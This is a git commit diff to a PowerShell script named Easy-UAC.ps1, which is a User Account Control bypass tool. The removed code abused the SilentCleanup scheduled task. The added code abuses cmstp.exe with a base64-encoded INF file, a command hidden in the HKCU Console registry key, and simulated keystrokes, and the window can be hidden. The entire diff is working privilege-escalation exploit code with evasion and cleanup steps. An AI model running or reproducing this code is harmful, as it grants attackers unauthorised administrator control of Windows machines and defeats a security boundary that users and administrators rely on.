fbd4bc1a17ab5deb89073ae6dee9f55e1d343fec
moritzpfefferkorn@hotmail.com <moritzpfefferkorn@hotmail.com>
2021-06-18 21:58:22 +0200

    Update Easy-UAC.ps1

--- Easy-UAC.ps1
+++ Easy-UAC.ps1
@@ -16,18 +16,23 @@ function Easy-UAC {
 		$NoExitChild,
 		[Parameter(Mandatory = $false, Position = 4)]
 		[Int64]
-		$SleepDuration = 2
+		$SleepDuration = 500
 	)
 	if ($Hidden) {powershell -WindowStyle Hidden -c ""; $hide = "-WindowStyle Hidden"} else {$hide = ""}
 	if ($NoExitChild) {$end = "pause"} else {$end = "Exit;Exit;Exit"}
 	$encCommand = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($Command))
-	$Path = $env:TEMP + '\A.bat'
-	$Value = "powershell $hide -c Remove-Item $Path;[System.Environment]::SetEnvironmentVariable('A', `$null,[System.EnvironmentVariableTarget]::User);powershell ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + $encCommand + "')));$end"
-	[System.Environment]::SetEnvironmentVariable('A', $Value, [System.EnvironmentVariableTarget]::User)
-	New-Item -Path $Path -Value '%A%'
-	New-ItemProperty 'HKCU:\Environment' -Name 'windir' -Value 'cmd.exe /k cmd.exe' -PropertyType String -Force
-	powershell.exe -Command "schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
-	[System.Environment]::SetEnvironmentVariable('A', $null,[System.EnvironmentVariableTarget]::User)
+	$Path = $env:TEMP + '\A.ini'
+	$Value = "powershell $hide -c Remove-Item $Path -Fo;Remove-ItemProperty -Pa 'HKCU:\Console' -N 'X' -Fo;powershell ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + $encCommand + "')));$end"
+	New-ItemProperty -Path 'HKCU:\Console' -Name 'X' -Value $Value -Force
+	[IO.File]::WriteAllBytes($Path, [Convert]::FromBase64String('W3ZlcnNpb25dDQpTaWduYXR1cmU9JGNoaWNhZ28kDQpBZHZhbmNlZElORj0yLjUNCg0KW0RlZmF1bHRJbnN0YWxsXQ0KQ3VzdG9tRGVzdGluYXRpb249Q3VzdEluc3REZXN0U2VjdGlvbkFsbFVzZXJzDQpSdW5QcmVTZXR1cENvbW1hbmRzPVJ1blByZVNldHVwQ29tbWFuZHNTZWN0aW9uDQoNCltSdW5QcmVTZXR1cENvbW1hbmRzU2VjdGlvbl0NCnBvd2Vyc2hlbGwgLWMgIklFWCgoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcQ29uc29sZScpLlgpIg0KdGFza2tpbGwgL0lNIGNtc3RwLmV4ZSAvRg0KDQpbQ3VzdEluc3REZXN0U2VjdGlvbkFsbFVzZXJzXQ0KNDkwMDAsNDkwMDE9QWxsVVNlcl9MRElEU2VjdGlvbiwgNw0KDQpbQWxsVVNlcl9MRElEU2VjdGlvbl0NCiJIS0xNIiwgIlNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEFwcCBQYXRoc1xDTU1HUjMyLkVYRSIsICJQcm9maWxlSW5zdGFsbFBhdGgiLCAiJVVuZXhwZWN0ZWRFcnJvciUiLCAiIg0KDQpbU3RyaW5nc10NClNlcnZpY2VOYW1lPSJOZXR3b3JrIFNlcnZpY2UiDQpTaG9ydFN2Y05hbWU9Ik5ldHdvcmsgU2VydmljZSI='))
+	Get-Process -Name 'cmstp.exe' -ErrorAction SilentlyContinue | Stop-Process -Force
+	cmstp.exe /au $Path
+	$WSH = New-Object -ComObject WScript.Shell
+	$WSH.AppActivate('Network Service')
+	Start-Sleep -Milliseconds $SleepDuration
+	$WSH.SendKeys('{ENTER}')
+	pause
+	Remove-ItemProperty -Path 'HKCU:\Console' -Name 'X' -Force
 	Remove-Item $Path
 	if (!$NoExitHost) {Exit;Exit;Exit}
 }
